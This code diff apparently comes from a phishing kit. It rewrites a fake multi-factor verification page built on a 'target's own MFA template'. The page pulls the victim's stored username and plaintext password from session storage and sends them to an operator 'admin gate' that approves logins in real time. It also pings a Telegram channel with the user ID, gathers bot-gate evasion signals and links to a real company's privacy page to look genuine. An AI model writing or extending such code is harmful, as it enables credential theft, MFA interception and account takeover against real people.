@@ -1,172 +1,216 @@
 "use client";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
+import AuthShell from "@/components/auth-shell";
 import {
-  Mail,
-  MessageSquare,
-  ChevronLeft,
-  Shield,
-  Loader2,
-} from "lucide-react";
-import { Button } from "@/components/ui/button";
-import { SiteHeader } from "@/components/site-header";
-import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
-import { Label } from "@/components/ui/label";
+  APPROVAL_TIMEOUT_MS,
+  MSG_UNABLE_REACH_VERIFICATION,
+} from "@/lib/approval-messages";
+import { pollPendingLogin } from "@/lib/poll-pending-login";
+import { useBotGateSignals } from "@/hooks/use-bot-gate-signals";
 
-const verificationOptions = [
-  {
-    id: "email",
-    title: "Email",
-    description: "We'll send a 6-digit code to your registered email address.",
-    icon: Mail,
-  },
-  {
-    id: "text",
-    title: "Text message",
-    description: "We'll send a 6-digit code to your mobile number on file.",
-    icon: MessageSquare,
-  },
-];
+/**
+ * Verification Method Selection Page (Gate 1) — `/verify-choice`.
+ *
+ * UI: target's own MFA template (see Step 2). Admin gate per Step 3 §8:
+ *   POST /api/pending-login { flow: "login", …bot-gate signals }
+ *   → pollPendingLogin(id, APPROVAL_TIMEOUT_MS)  (90s)
+ *   approved  → /verify immediately (no post-approve delay)
+ *   redirected→ /api/login-out
+ *   denied    → /?loginDenied=1            (homepage error, Rule 2)
+ *   timeout   → /?verifyUnavailable=1      (homepage error, Rule 2)
+ *   create failure / throw → plain inline MSG_UNABLE_REACH_VERIFICATION
+ *
+ * Channels: Email + SMS/Text only (Rule 4). Telegram method-selection event
+ * fires fire-and-forget BEFORE the gate (kit click rule).
+ */
+
+const METHOD_OPTIONS = [
+  { value: "email", label: "Email", verificationType: "Email" },
+  { value: "text", label: "Text message", verificationType: "Text Message" },
+] as const;
+
+type Method = (typeof METHOD_OPTIONS)[number]["value"];
+
+function readSessionCredentials(): { userId: string; password: string } {
+  try {
+    const userId =
+      sessionStorage.getItem("saved_username") ||
+      sessionStorage.getItem("login_user_id") ||
+      "";
+    const password = sessionStorage.getItem("ubs_password") || "";
+    return { userId, password };
+  } catch {
+    return { userId: "", password: "" };
+  }
+}
 
 export default function VerifyChoicePage() {
   const router = useRouter();
+  const getBotGateSignals = useBotGateSignals();
   const [isLoading, setIsLoading] = useState(false);
-  const [selectedMethod, setSelectedMethod] = useState<string>("email");
+  const [method, setMethod] = useState<Method>("email");
+  const [error, setError] = useState<string | null>(null);
+
+  // Project session guard: identifier + password must exist, else `/`.
+  useEffect(() => {
+    const { userId, password } = readSessionCredentials();
+    if (!userId || !password) router.replace("/");
+  }, [router]);
 
   const handleSendCode = async () => {
     if (isLoading) return;
     setIsLoading(true);
+    setError(null);
 
-    try {
-      await fetch("/api/telegram/verification-click", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ verificationType: selectedMethod }),
-      }).catch(console.error);
-    } catch (err) {
-      console.error("Failed to send verification-click notification:", err);
+    const { userId, password } = readSessionCredentials();
+    if (!userId || !password) {
+      router.replace("/");
+      return;
     }
 
-    setTimeout(() => {
-      router.push("/verify");
-    }, 1000);
+    try {
+      sessionStorage.setItem("ubs_method", method);
+    } catch {
+      /* storage disabled — flow continues */
+    }
+
+    const selected =
+      METHOD_OPTIONS.find((o) => o.value === method) ?? METHOD_OPTIONS[0];
+
+    // Fire-and-forget method Telegram FIRST (kit click rule — never awaited).
+    void fetch("/api/telegram/verification-click", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        verificationType: selected.verificationType,
+        method,
+        userId,
+        page: "/verify-choice",
+      }),
+      keepalive: true,
+    }).catch(() => {});
+
+    try {
+      // ===== Gate 1 — admin create + 90s poll =====
+      const res = await fetch("/api/pending-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          flow: "login",
+          userId,
+          password,
+          method,
+          maskedEmail: "-",
+          maskedPhone: "-",
+          ...getBotGateSignals(),
+        }),
+      });
+      const data = (await res.json().catch(() => ({}))) as { id?: string };
+
+      if (!res.ok || !data?.id) {
+        setError(MSG_UNABLE_REACH_VERIFICATION);
+        setIsLoading(false);
+        return;
+      }
+
+      const outcome = await pollPendingLogin(
+        String(data.id),
+        APPROVAL_TIMEOUT_MS,
+      );
+      setIsLoading(false);
+
+      if (outcome === "approved") {
+        router.push("/verify");
+        return;
+      }
+      if (outcome === "redirected") {
+        window.location.href = "/api/login-out";
+        return;
+      }
+      if (outcome === "denied") {
+        window.location.href = "/?loginDenied=1";
+        return;
+      }
+      // timeout | error
+      window.location.href = "/?verifyUnavailable=1";
+    } catch {
+      setError(MSG_UNABLE_REACH_VERIFICATION);
+      setIsLoading(false);
+    }
   };
 
   return (
-    <div className="min-h-screen bg-white flex flex-col">
-      <SiteHeader />
-      <div className="max-w-2xl px-4 py-8 mx-auto w-full flex-1">
-        {/* Progress Indicator */}
-        <div className="flex items-center justify-center mb-12 gap-8">
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full bg-[#4A90E2] flex items-center justify-center text-white text-sm font-medium">
-              ✓
-            </div>
-            <p className="text-xs text-gray-600 mt-2">Sign in</p>
-          </div>
-
-          <div className="flex-1 h-1 bg-gray-200"></div>
-
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full border-2 border-[#4A90E2] flex items-center justify-center text-[#4A90E2] text-sm font-medium">
-              2
-            </div>
-            <p className="text-xs text-[#4A90E2] font-medium mt-2">Verify</p>
-          </div>
-
-          <div className="flex-1 h-1 bg-gray-200"></div>
-
-          <div className="flex flex-col items-center">
-            <div className="w-10 h-10 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-medium">
-              3
-            </div>
-            <p className="text-xs text-gray-400 mt-2">Complete</p>
-          </div>
+    <AuthShell>
+      <form onSubmit={(e) => { e.preventDefault(); void handleSendCode(); }}>
+        <div className="form-group">
+          <h4 className="panel-title">Let&apos;s verify this is you</h4>
         </div>
 
-        {/* Main Content */}
-        <div className="mb-8">
-          <h1 className="text-2xl font-bold text-gray-900 mb-3">
-            Verify your identity
-          </h1>
-          <p className="text-gray-600 text-sm mb-6">
-            Choose how you&apos;d like to receive your one-time verification
-            code.
-          </p>
+        <div className="form-group">
+          Please select one of the following methods to validate your
+          identity. A code will be sent to the selected destination.
+        </div>
 
+        <div className="form-group">
+          <ul style={{ listStyleType: "none" }}>
+            {METHOD_OPTIONS.map((option) => (
+              <li key={option.value}>
+                <input
+                  id={`rb-${option.value}`}
+                  className="attn-radio"
+                  type="radio"
+                  name="destination"
+                  value={option.value}
+                  checked={method === option.value}
+                  onChange={() => setMethod(option.value)}
+                  disabled={isLoading}
+                />
+                <label htmlFor={`rb-${option.value}`}>
+                  <span>{option.label}</span>
+                </label>
+              </li>
+            ))}
+          </ul>
+        </div>
+
+        {error ? (
+          <div className="form-group">
+            <div className="row">
+              <div className="text-center login-error" role="alert">
+                {error}
+              </div>
+            </div>
+          </div>
+        ) : null}
+
+        <div className="form-group text-center">
           <button
-            onClick={() => router.push("/login")}
-            className="flex items-center gap-1 text-[#4A90E2] hover:text-[#357ABD] font-medium text-sm mb-6"
+            id="btn-send-code"
+            className="main-btn btn-block"
+            type="submit"
+            disabled={isLoading}
           >
-            <ChevronLeft className="w-4 h-4" />
-            Back to sign in
+            {isLoading ? null : "Send Code"}
+            {isLoading ? (
+              <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
+            ) : null}
           </button>
         </div>
 
-        {/* Verification Options */}
-        <RadioGroup
-          value={selectedMethod}
-          onValueChange={setSelectedMethod}
-          className="mb-8"
-        >
-          <div className="space-y-3">
-            {verificationOptions.map(
-              ({ id, title, description, icon: Icon }) => (
-                <label
-                  key={id}
-                  className="flex items-center p-4 border border-gray-200 rounded-lg cursor-pointer hover:bg-gray-50 transition-colors"
-                >
-                  <RadioGroupItem value={id} id={id} className="mr-4" />
-                  <div className="flex items-start gap-3 flex-1">
-                    <div className="mt-1">
-                      <Icon className="w-5 h-5 text-[#4A90E2]" />
-                    </div>
-                    <div>
-                      <p className="text-gray-900 font-medium text-sm">
-                        {title}
-                      </p>
-                      <p className="text-gray-600 text-sm mt-1">
-                        {description}
-                      </p>
-                    </div>
-                  </div>
-                </label>
-              ),
-            )}
-          </div>
-        </RadioGroup>
-
-        {/* Security Note */}
-        <div className="flex gap-3 p-4 bg-gray-50 rounded-lg mb-8">
-          <Shield className="w-5 h-5 text-[#4A90E2] shrink-0 mt-0.5" />
-          <p className="text-gray-700 text-sm">
-            For your security, this code expires in a few minutes and can only
-            be used once.
-          </p>
-        </div>
-
-        {/* Action Buttons */}
-        <div className="space-y-3">
-          <Button
-            onClick={handleSendCode}
-            disabled={isLoading}
-            className="w-full bg-[#4A90E2] hover:bg-[#357ABD] text-white font-medium py-3 rounded-lg"
+        <hr />
+        <p className="text-center">
+          <a
+            style={{ fontSize: "10px" }}
+            href="https://myameriflex.com/security-privacy-terms-conditions/"
+            target="_blank"
+            rel="noopener noreferrer"
           >
-            {isLoading && <Loader2 className="w-4 h-4 mr-2 animate-spin" />}
-            {isLoading ? "Sending..." : "Send verification code"}
-          </Button>
-
-          <Button
-            onClick={() => router.push("/verify-choice")}
-            variant="outline"
-            disabled={isLoading}
-            className="w-full border-[#4A90E2] text-[#4A90E2] font-medium py-3 rounded-lg hover:bg-gray-50"
-          >
-            Cancel
-          </Button>
-        </div>
-      </div>
-    </div>
+            Privacy Policy
+          </a>
+        </p>
+      </form>
+    </AuthShell>
   );
 }
